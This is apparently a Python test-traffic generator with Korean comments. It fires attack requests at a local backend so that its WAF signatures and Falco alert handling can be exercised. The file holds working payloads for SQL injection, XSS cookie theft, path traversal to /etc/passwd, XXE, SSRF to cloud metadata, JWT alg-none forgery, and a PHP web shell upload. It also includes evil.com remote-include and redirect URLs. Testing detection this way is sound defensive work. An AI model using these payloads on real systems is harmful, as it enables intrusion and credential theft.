"""
백엔드로 가짜 공격 이벤트를 흘려보내는 더미 생성기.

실제 파이프라인을 그대로 타야 의미가 있으므로 Kafka가 아니라
백엔드가 실제로 받는 두 경로에 맞춰 HTTP로 직접 보낸다:

1) WAF 계열 공격 -> app/proxy/proxy.py의 /proxy/{path}로 실제 공격 페이로드를 담아
   요청을 보내서, app/detection/engine.py + signatures.py의 탐지 로직이
   그대로 동작하게 한다 (탐지되면 403 + AttackLog 저장 + WS 브로드캐스트).
2) Falco 계열 탐지 -> app/api/alerts.py가 기대하는 필드(output_fields 등)를
   갖춘 JSON을 POST /api/alerts로 보낸다 (falco-values.yaml의 http_output과 동일한 형태).
"""
import base64
import json
import os
import random
import time

import requests
from faker import Faker

BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:8000")
EVENTS_PER_SECOND = int(os.getenv("EVENTS_PER_SECOND", "5"))
REQUEST_TIMEOUT_SECONDS = 5

fake = Faker()


# --- WAF 계열: app/detection/signatures.py의 정규식과 실제로 매칭되는 페이로드 ---

def _build_sqli_request():
    # app/proxy/proxy.py의 inspect_request()는 body_text/headers_text만 검사하고
    # 쿼리 파라미터나 URL 경로는 보지 않으므로, 페이로드는 반드시 body에 실어야 탐지된다.
    payload = random.choice(["' OR 1=1 --", "1 UNION SELECT username, password FROM users"])
    return {"method": "POST", "path": "rest/products/search", "json": {"q": payload}}


def _build_xss_request():
    payload = random.choice(["<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>"])
    return {"method": "POST", "path": "api/Feedbacks", "json": {"comment": payload, "rating": 1}}


def _build_path_traversal_request():
    payload = random.choice(["../../../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"])
    return {"method": "POST", "path": "rest/user/change-password", "json": {"filename": payload}}


def _build_os_command_injection_request():
    payload = random.choice(["; cat /etc/passwd", "| whoami"])
    return {"method": "POST", "path": "rest/admin/application-version", "json": {"cmd": payload}}


def _build_jwt_forgery_request():
    # engine.py의 _check_jwt_alg_none()이 헤더 세그먼트만 base64 디코딩해서 alg 값을 확인한다.
    header_b64 = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps({"sub": fake.user_name(), "admin": True}).encode()
    ).decode().rstrip("=")
    token = f"{header_b64}.{payload_b64}."
    return {"method": "GET", "path": "rest/user/whoami", "headers": {"Authorization": f"Bearer {token}"}}


def _build_ssti_request():
    payload = random.choice(["{{7*7}}", "{{ config }}", "${7*7}"])
    return {"method": "POST", "path": "rest/user/change-profile", "json": {"nickname": payload}}


def _build_xxe_request():
    xml_payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<foo>&xxe;</foo>"
    )
    return {
        "method": "POST",
        "path": "rest/user/import",
        "data": xml_payload,
        "headers": {"Content-Type": "application/xml"},
    }


def _build_ssrf_request():
    payload = random.choice(["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:6379/"])
    return {"method": "POST", "path": "rest/user/avatar-from-url", "json": {"url": payload}}


def _build_nosqli_request():
    return {
        "method": "POST",
        "path": "rest/user/login",
        "json": {"email": {"$ne": None}, "password": {"$ne": None}},
    }


def _build_rfi_request():
    payload = random.choice(["http://evil.com/shell.txt", "php://filter/convert.base64-encode/resource=index.php"])
    return {"method": "POST", "path": "rest/products/search", "json": {"page": payload}}


def _build_file_upload_request():
    return {
        "method": "POST",
        "path": "file-upload",
        "files": {"file": ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")},
    }


def _build_insecure_deserialization_request():
    payload = random.choice(['O:4:"User":2:{s:2:"id";i:1;s:5:"admin";b:1;}', "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ=="])
    return {"method": "POST", "path": "rest/user/session", "json": {"data": payload}}


def _build_open_redirect_request():
    payload = random.choice(["//evil.com/phish", "https://evil.com/phish"])
    return {"method": "POST", "path": "rest/user/redirect", "json": {"redirect": payload}}


def _build_crlf_injection_request():
    return {"method": "POST", "path": "rest/language", "json": {"lang": "ko\r\nSet-Cookie: admin=true"}}


def _build_ldap_injection_request():
    return {"method": "POST", "path": "rest/user/search", "json": {"uid": "*)(uid=*))(|(uid=*"}}


def _build_xpath_injection_request():
    return {"method": "POST", "path": "rest/user/lookup", "json": {"username": "'] | //user | ['"}}


def _build_csrf_request():
    # Origin/Referer 없이 세션 쿠키만 실어서 상태변경 요청을 흉내낸다.
    # 공격자 페이지의 <form> 자동 제출은 fetch/XHR이 아니라서 브라우저가 Origin을 안 붙이는
    # 경우가 흔한데, requests 라이브러리도 명시적으로 안 넣는 한 마찬가지라 그대로 재현된다.
    return {
        "method": "POST",
        "path": "rest/user/change-password",
        "json": {"newPassword": "hacked1234"},
        "headers": {"Cookie": f"session={fake.sha1()[:16]}"},
    }


def _build_hpp_request():
    # engine.py가 아니라 proxy.py에서 별도로 잡는다 (같은 이름의 쿼리 파라미터가 중복으로 옴)
    return {"method": "GET", "path": "rest/products/search", "params": [("q", "widget"), ("q", "' OR 1=1 --")]}


WAF_REQUEST_BUILDERS = [
    _build_sqli_request,
    _build_xss_request,
    _build_path_traversal_request,
    _build_os_command_injection_request,
    _build_jwt_forgery_request,
    _build_ssti_request,
    _build_xxe_request,
    _build_ssrf_request,
    _build_nosqli_request,
    _build_rfi_request,
    _build_file_upload_request,
    _build_insecure_deserialization_request,
    _build_open_redirect_request,
    _build_crlf_injection_request,
    _build_ldap_injection_request,
    _build_xpath_injection_request,
    _build_csrf_request,
    _build_hpp_request,
]


def send_waf_event():
    """실제 공격 페이로드를 담아 /proxy/{path}로 요청을 보낸다 (WAF 탐지 트리거)."""
    request_spec = random.choice(WAF_REQUEST_BUILDERS)()
    url = f"{BACKEND_URL}/proxy/{request_spec['path']}"
    try:
        response = requests.request(
            method=request_spec.get("method", "GET"),
            url=url,
            params=request_spec.get("params"),
            json=request_spec.get("json"),
            data=request_spec.get("data"),
            files=request_spec.get("files"),
            headers=request_spec.get("headers"),
            timeout=REQUEST_TIMEOUT_SECONDS,
        )
        print(f"[WAF] {request_spec.get('method', 'GET')} /{request_spec['path']} -> {response.status_code}")
    except requests.RequestException as e:
        print(f"[WAF] Error sending request: {e}")


# --- Falco 계열: app/api/alerts.py가 파싱하는 output_fields 스키마에 맞춘 이벤트 ---

# rule 문자열의 키워드로 AttackType이 분기되므로(alerts.py 참고),
# 매핑 로직이 실제로 다 exercise되도록 룰 이름을 골라서 섞는다.
FALCO_RULES = [
    "Read sensitive file untrusted",       # -> PATH_TRAVERSAL ("read sensitive" 포함)
    "Search Private Keys or Passwords",    # -> JWT_FORGERY ("private key" 포함)
    "Terminal shell in container",         # -> 기본값(OS_COMMAND_INJECTION)
    "Unauthorized File Modification",      # -> 기본값(OS_COMMAND_INJECTION)
]
FALCO_PRIORITIES = ["Critical", "Warning", "Notice", "Informational"]
SENSITIVE_PATHS = ["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa", "/bin/bash"]


def _build_falco_event():
    rule = random.choice(FALCO_RULES)
    priority = random.choice(FALCO_PRIORITIES)
    proc_name = fake.word()
    pod_name = f"{fake.word()}-{fake.random_int(1000, 9999)}"

    return {
        "output": f"Rule '{rule}' fired by proc={proc_name} in pod={pod_name}",
        "priority": priority,
        "rule": rule,
        "output_fields": {
            "k8s.pod.name": pod_name,
            "container.id": fake.sha1()[:12],
            "container.image.repository": f"{fake.word()}/{fake.word()}",
            "fd.name": random.choice(SENSITIVE_PATHS),
            "proc.name": proc_name,
        },
    }


def send_falco_event():
    """falco-values.yaml의 http_output과 동일하게 POST /api/alerts로 보낸다."""
    event = _build_falco_event()
    try:
        response = requests.post(f"{BACKEND_URL}/api/alerts", json=event, timeout=REQUEST_TIMEOUT_SECONDS)
        print(f"[Falco] {event['rule']} -> {response.status_code}")
    except requests.RequestException as e:
        print(f"[Falco] Error sending event: {e}")


def main():
    print(f"Starting dummy event generator against backend: {BACKEND_URL}")
    print(f"Generating {EVENTS_PER_SECOND} events per second...")

    event_counter = 0
    start_time = time.time()

    while True:
        if event_counter >= EVENTS_PER_SECOND:
            elapsed_time = time.time() - start_time
            if elapsed_time < 1.0:
                time.sleep(1.0 - elapsed_time)
            event_counter = 0
            start_time = time.time()

        # 8:2 비율로 WAF:Falco 이벤트 발생 (기존 스크립트 비율 유지)
        if random.random() < 0.8:
            send_waf_event()
        else:
            send_falco_event()

        event_counter += 1


if __name__ == "__main__":
    main()
